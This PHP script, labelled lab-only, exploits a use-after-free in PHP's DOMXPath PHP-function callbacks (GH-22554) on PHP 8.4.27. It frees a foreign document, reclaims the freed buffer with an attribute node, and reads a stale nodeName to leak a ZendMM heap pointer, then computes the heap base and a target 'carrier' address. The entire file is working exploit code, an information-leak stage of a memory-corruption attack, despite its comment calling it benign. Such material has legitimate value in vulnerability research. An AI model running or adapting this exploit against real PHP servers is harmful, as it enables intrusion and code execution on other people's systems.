<?php
/**
 * LAB-ONLY in-band ZendMM seed via the GH-22554 XPath foreign-document UAF.
 *
 * A DOMXPath PHP-function callback returns a node from a throwaway document;
 * after unset($xp) the foreign document is freed but the result proxy still
 * points at its node. Reclaiming the freed tag-name buffer with an xmlAttr
 * (whose _private is an emalloc/ZendMM pointer) makes the stale nodeName read
 * return raw pointer bytes. `main = leak & ~0x1FFFFF`.
 *
 * This payload is meant to be executed by a lab harness endpoint (e.g.
 * /eval.php) on PHP 8.4.27; it is fixed-length and benign.
 */
$TAG = str_repeat('a', 95);
$doc = new DOMDocument;
$doc->loadXML('<root/>');
$xp = new DOMXPath($doc);
$xp->registerNamespace('my', 'my.ns');
$xp->registerPHPFunctionNS('my.ns', 'include', function () use ($TAG) {
    $d = new DOMDocument;
    $r = $d->appendChild($d->createElement('r'));
    $r->appendChild($d->createElement($TAG))
      ->appendChild($d->createTextNode('SECRETDATA'));
    return $d->documentElement;
});
$res = $xp->query('my:include()/' . $TAG);
$n = $res->item(0);
unset($xp);
$keep = new DOMDocument;
$ke = $keep->appendChild($keep->createElement('k'));
$a = $keep->createAttributeNS('urn:x0', 'p0:a');
$ke->setAttributeNodeNS($a);
$nm = (string)@$n->nodeName;
$leak = unpack('P', substr($nm, 0, 6) . "\0\0")[1];
$main = $leak & ~0x1FFFFF;
printf("leak=%s main=%s carrier=%s\n", dechex($leak), dechex($main),
       dechex($main + 0x6A018));
@flush();
